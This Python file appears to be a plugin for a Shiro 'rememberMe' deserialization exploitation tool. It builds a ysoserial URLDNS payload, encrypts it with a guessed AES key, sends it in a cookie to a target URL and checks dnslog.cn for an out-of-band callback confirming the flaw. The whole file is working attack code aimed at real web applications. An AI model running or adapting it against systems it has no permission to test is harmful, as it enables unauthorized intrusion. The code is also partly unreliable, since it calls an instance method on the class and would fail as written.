# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import re
import base64
import uuid
import subprocess
import requests
import sys
import threadpool
from Crypto.Cipher import AES
from ..main import Idea
requests.packages.urllib3.disable_warnings()

JAR_FILE = 'moule/ysoserial.jar'

@Idea.plugin_register('Class1:URLDNS')
class URLDNS(object):
    def getDnslogCookie(self):
        import requests
        dnslog    = "http://dnslog.cn/getdomain.php"
        res       = requests.get(dnslog,timeout=10)
        dnslogUrl = res.text
        cookie    = res.cookies
        phpsessid = cookie['PHPSESSID']
        return  dnslogUrl, phpsessid

    def process(self,url,command,resKey):
        
        self.sendPayload(url,command,resKey)


    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        func = URLDNS.getDnslogCookie()
        dnslog = func[0]
        phpsessid = func[1]
        checkUrl = "http://urldns.{}".format(dnslog)

        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        checkUrlPopen = subprocess.Popen(['java', '-jar', fp, 'URLDNS', checkUrl],       #popen
                                    stdout=subprocess.PIPE)


        status = self.sendCommand(url,resKey,checkUrlPopen)
 
        if(status==200):
            print("[+]   ****URLDNS模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(status)))
        else:
            print("[-]   ****URLDNS模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(status)))

        check = self.checkDnslogResult(phpsessid)
        
        if check:
            print("[+]   ****目标环境是否存在此利用链(此链无法执行命令,仅供验证): YES")
        else:
            print("[+]   ****目标环境是否存在此利用链: NO")


    def sendCommand(self,url,resKey,popen):
        key = resKey
        target = url
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
        file_body = pad(popen.stdout.read())        #受popen影响的file_body
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
    
        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
            }
        try:
            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
            status = r.status_code
            return status
        except Exception as e:
            print(e)
            return False


    def checkDnslogResult(self,phpsessid):
        url = "http://www.dnslog.cn/getrecords.php"
        headerSessid= {
            "Cookie": "PHPSESSID={}".format(phpsessid)
        }
        res = requests.get(url,headers=headerSessid,timeout=10)
        if 'urldns' in str(res.text):
            return True
        else:
            return False